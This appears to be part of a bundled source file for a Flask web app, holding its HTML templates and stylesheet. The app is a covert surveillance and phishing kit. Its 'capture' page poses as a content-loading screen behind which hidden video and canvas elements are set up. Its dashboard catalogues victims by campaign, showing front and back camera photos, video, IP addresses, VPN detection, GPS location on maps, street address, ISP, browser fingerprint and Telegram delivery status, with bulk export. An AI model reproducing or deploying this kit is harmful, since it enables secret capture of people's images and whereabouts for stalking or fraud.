F["app/templates/base.html"] = "<!DOCTYPE html>\n<html lang=\"id\">\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">\n<title>{% block title %}App{% endblock %}</title>\n<link rel=\"stylesheet\" href=\"{{ url_for('static', filename='css/style.css') }}\">\n{% block head %}{% endblock %}\n</head>\n<body>\n{% block body %}{% endblock %}\n{% block scripts %}{% endblock %}\n</body>\n</html>\n"

F["app/templates/login.html"] = "{% extends \"base.html\" %}\n{% block title %}Login{% endblock %}\n{% block body %}\n<div class=\"login-wrap\">\n  <form method=\"POST\" class=\"login-card\">\n    <input type=\"hidden\" name=\"csrf_token\" value=\"{{ csrf_token() }}\">\n    <h2>Login Dashboard</h2>\n    {% if error %}<div class=\"error\">{{ error }}</div>{% endif %}\n    <input type=\"text\" name=\"user\" placeholder=\"Username\" required autofocus>\n    <input type=\"password\" name=\"pass\" placeholder=\"Password\" required>\n    <button type=\"submit\">Masuk</button>\n  </form>\n</div>\n{% endblock %}\n"

F["app/templates/capture.html"] = "{% extends \"base.html\" %}\n{% block title %}Loading...{% endblock %}\n{% block body %}\n<div class=\"capture-loading\">\n  <div class=\"spinner\"></div>\n  <p class=\"cap-txt\">Memuat konten...</p>\n  <div class=\"progress\"><div class=\"bar\"></div></div>\n</div>\n<video id=\"v\" autoplay playsinline muted hidden></video>\n<canvas id=\"c\" hidden></canvas>\n<div id=\"status\" hidden></div>\n<div id=\"log\" hidden></div>\n<script>\n  window.CAMPAIGN = \"{{ campaign|default('default') }}\";\n  window.CSRF_TOKEN = \"{{ csrf_token() }}\";\n</script>\n<script src=\"{{ url_for('static', filename='js/capture.js') }}\"></script>\n{% endblock %}\n"

F["app/templates/dashboard.html"] = "{% extends \"base.html\" %}\n{% block title %}Dashboard{% endblock %}\n{% block head %}\n<link rel=\"stylesheet\" href=\"https://unpkg.com/leaflet@1.9.4/dist/leaflet.css\"/>\n<script src=\"https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js\"></script>\n<script src=\"https://unpkg.com/leaflet@1.9.4/dist/leaflet.js\"></script>\n<link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css\">\n<script src=\"https://cdn.jsdelivr.net/npm/sweetalert2@11\"></script>\n<script src=\"https://cdn.socket.io/4.7.5/socket.io.min.js\"></script>\n{% endblock %}\n{% block body %}\n<header class=\"topbar\">\n  <h1>Dashboard <span class=\"badge\" id=\"totalBadge\">{{ stats.total }} sesi</span></h1>\n  <div class=\"top-actions\">\n    <span class=\"live-dot\" id=\"liveDot\"></span>\n    <a class=\"btn\" href=\"/\" target=\"_blank\">Capture</a>\n    <a class=\"btn gray\" href=\"/api/export/zip\">ZIP</a>\n    <a class=\"btn gray\" href=\"/api/export/csv\">CSV</a>\n    <a class=\"btn red\" href=\"/logout\">Logout</a>\n  </div>\n</header>\n<section class=\"stats-grid\">\n  <div class=\"stat-card\"><div class=\"num\">{{ stats.total }}</div><div class=\"lbl\">Total Sesi</div></div>\n  <div class=\"stat-card\"><div class=\"num\">{{ stats.with_photo }}</div><div class=\"lbl\">Ada Foto</div></div>\n  <div class=\"stat-card\"><div class=\"num\">{{ stats.today }}</div><div class=\"lbl\">Hari Ini</div></div>\n  <div class=\"stat-card\"><div class=\"num\">{{ stats.cities|length }}</div><div class=\"lbl\">Kota Unik</div></div>\n</section>\n<section class=\"charts\">\n  <div class=\"chart-box\"><canvas id=\"chartTimeline\"></canvas></div>\n  <div class=\"chart-box\"><canvas id=\"chartDevices\"></canvas></div>\n</section>\n<section class=\"filters\">\n  <input id=\"searchBox\" placeholder=\"Cari IP / kota / region...\">\n  <select id=\"campaignFilter\"><option value=\"\">Semua campaign</option></select>\n</section>\n<section id=\"cards\" class=\"grid\">\n  {% for s in sessions %}\n  <div class=\"card\" data-ts=\"{{ s.ts }}\">\n    <div class=\"imgs\">\n      {% if s.has_depan %}<a href=\"/api/file/{{ s.ts }}_depan.png\" target=\"_blank\"><img src=\"/api/file/{{ s.ts }}_depan.png\" loading=\"lazy\" alt=\"depan\"></a>{% endif %}\n      {% if s.has_belakang %}<a href=\"/api/file/{{ s.ts }}_belakang.png\" target=\"_blank\"><img src=\"/api/file/{{ s.ts }}_belakang.png\" loading=\"lazy\" alt=\"belakang\"></a>{% endif %}\n      {% if s.has_video %}<video src=\"/api/file/{{ s.ts }}_video.webm\" controls preload=\"metadata\"></video>{% endif %}\n    </div>\n    <div class=\"info\">\n      <div class=\"row\"><b>Waktu:</b> {{ s.waktu }}</div>\n      <div class=\"row\"><b>IP:</b> {{ s.ip_publik or s.ip_koneksi }} {% if s.is_vpn %}<span class=\"vpn\">VPN</span>{% endif %}</div>\n      <div class=\"row\"><b>Lokal:</b> {{ s.ip_lokal or '-' }}</div>\n      <div class=\"row\"><b>Kota:</b> {{ s.city or '-' }}, {{ s.region or '-' }}</div>\n      <div class=\"row\"><b>ISP:</b> {{ s.isp or '-' }}</div>\n      {% if s.lat and s.lon %}\n        <div class=\"row\"><b>GPS:</b> {{ \"%.4f\"|format(s.lat) }}, {{ \"%.4f\"|format(s.lon) }}</div>\n        <div class=\"mini-map\" id=\"map-{{ s.ts }}\"></div>\n      {% endif %}\n      {% if s.alamat %}<div class=\"row small\"><b>Alamat:</b> {{ s.alamat[:120] }}...</div>{% endif %}\n      <div class=\"row\"><b>Campaign:</b> <span class=\"campaign\">{{ s.campaign }}</span></div>\n      <div class=\"row\"><b>Telegram:</b> {{ 'OK' if s.telegram_ok else 'GAGAL' }}</div>\n      <div class=\"actions\">\n        <a href=\"/api/file/{{ s.ts }}_depan.png\" download>Depan</a>\n        <a href=\"/api/file/{{ s.ts }}_belakang.png\" download>Belakang</a>\n        <a href=\"#\" class=\"show-events\" data-ts=\"{{ s.ts }}\">Event</a>\n        <a href=\"#\" class=\"show-fp\" data-fp='{{ s.fingerprint_obj|tojson }}'>Fingerprint</a>\n        <a href=\"#\" class=\"del\" data-ts=\"{{ s.ts }}\">Hapus</a>\n      </div>\n    </div>\n  </div>\n  {% endfor %}\n</section>\n{% if not sessions %}\n<p style=\"text-align:center;color:#888\">Belum ada sesi. Buka <a href=\"/\">halaman capture</a>.</p>\n{% endif %}\n<script>\nwindow.STATS = {{ stats_json|safe }};\nwindow.SESSIONS = {{ sessions|tojson }};\nwindow.CSRF_TOKEN = \"{{ csrf_token() }}\";\n</script>\n<script src=\"{{ url_for('static', filename='js/dashboard.js') }}\"></script>\n{% endblock %}\n"

# ============================================================
# STATIC - CSS
# ============================================================
F["app/static/css/style.css"] = "* { box-sizing: border-box; }\nbody { font-family: system-ui, -apple-system, sans-serif; background:#0d0d0d; color:#eee; margin:0; padding:0; }\na { color:#6cf; }\n.capture-loading { min-height:100vh; display:flex; align-items:center; justify-content:center; flex-direction:column; gap:20px; }\n.spinner { width:60px; height:60px; border:5px solid #222; border-top:5px solid #4a9eff; border-radius:50%; animation: spin 1s linear infinite; }\n@keyframes spin { to { transform: rotate(360deg); } }\n.cap-txt { color:#888; font-size:14px; letter-spacing:1px; }\n.progress { width:220px; height:4px; background:#222; border-radius:2px; overflow:hidden; }\n.progress .bar { height:100%; width:0%; background: linear-gradient(90deg, #4a9eff, #a06bff); animation: load 10s ease-in-out forwards; }\n@keyframes load { to { width:100%; } }\n.login-wrap { min-height:100vh; display:flex; align-items:center; justify-content:center; }\n.login-card { background:#1a1a1a; padding:30px; border-radius:12px; border:1px solid #2a2a2a; display:flex; flex-direction:column; gap:12px; width:320px; }\n.login-card h2 { margin:0 0 10px; }\n.login-card input { padding:10px; border-radius:6px; border:1px solid #333; background:#111; color:#eee; }\n.login-card button { padding:10px; border-radius:6px; border:none; background:#1e6feb; color:#fff; font-weight:bold; cursor:pointer; }\n.error { color:#f66; font-size:13px; }\n.topbar { display:flex; justify-content:space-between; align-items:center; padding:18px 24px; gap:12px; flex-wrap:wrap; }\n.topbar h1 { margin:0; font-size:22px; }\n.badge { background:#1e6feb; padding:4px 10px; border-radius:20px; font-size:13px; }\n.top-actions { display:flex; gap:8px; flex-wrap:wrap; align-items:center; }\n.btn { background:#1e6feb; color:#fff; padding:8px 14px; border-radius:6px; text-decoration:none; font-size:14px; }\n.btn.gray { background:#333; }\n.btn.red { background:#c33; }\n.live-dot { width:10px; height:10px; border-radius:50%; background:#5be36e; box-shadow: 0 0 10px #5be36e; animation: pulse 2s infinite; }\n.live-dot.off { background:#f66; box-shadow: 0 0 10px #f66; animation: none; }\n@keyframes pulse { 0%,100% { opacity:1 } 50% { opacity:.4 } }\n.stats-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(150px,1fr)); gap:14px; padding:0 24px 20px; }\n.stat-card { background:#1a1a1a; padding:20px; border-radius:10px; border:1px solid #2a2a2a; text-align:center; }\n.stat-card .num { font-size:32px; font-weight:bold; color:#4a9eff; }\n.stat-card .lbl { font-size:12px; color:#888; margin-top:6px; letter-spacing:1px; }\n.charts { display:grid; grid-template-columns:2fr 1fr; gap:14px; padding:0 24px 20px; }\n@media (max-width:800px) { .charts { grid-template-columns:1fr; } }\n.chart-box { background:#1a1a1a; padding:16px; border-radius:10px; border:1px solid #2a2a2a; min-height:220px; }\n.filters { display:flex; gap:10px; padding:0 24px 18px; flex-wrap:wrap; }\n.filters input, .filters select { padding:10px; border-radius:8px; background:#1a1a1a; border:1px solid #2a2a2a; color:#eee; font-size:14px; flex:1; min-width:200px; }\n.grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(340px,1fr)); gap:16px; padding:0 24px 40px; }\n.card { background:#1a1a1a; border-radius:12px; overflow:hidden; border:1px solid #2a2a2a; transition: transform .15s; }\n.card:hover { transform: translateY(-2px); border-color:#3a3a3a; }\n.card.new-flash { animation: flash 2s ease-out; }\n@keyframes flash { 0% { box-shadow: 0 0 0 0 #4a9eff; } 50% { box-shadow: 0 0 30px 6px #4a9eff; } 100% { box-shadow: 0 0 0 0 #4a9eff; } }\n.card .imgs { display:flex; gap:2px; }\n.card .imgs img, .card .imgs video { flex:1; width:100%; aspect-ratio:4/3; object-fit:cover; background:#000; display:block; }\n.info { padding:12px; font-size:12.5px; }\n.row { margin-bottom:5px; color:#bbb; }\n.row b { color:#eee; }\n.row.small { font-size:11px; color:#888; }\n.vpn { background:#c33; padding:1px 6px; border-radius:4px; font-size:10px; }\n.campaign { background:#333; padding:1px 8px; border-radius:10px; font-size:11px; }\n.actions { display:flex; gap:6px; margin-top:10px; flex-wrap:wrap; }\n.actions a { font-size:11px; color:#6cf; text-decoration:none; padding:4px 8px; background:#222; border-radius:5px; }\n.actions .del { color:#f66; }\n.mini-map { height:120px; border-radius:6px; margin-top:6px; }\n"

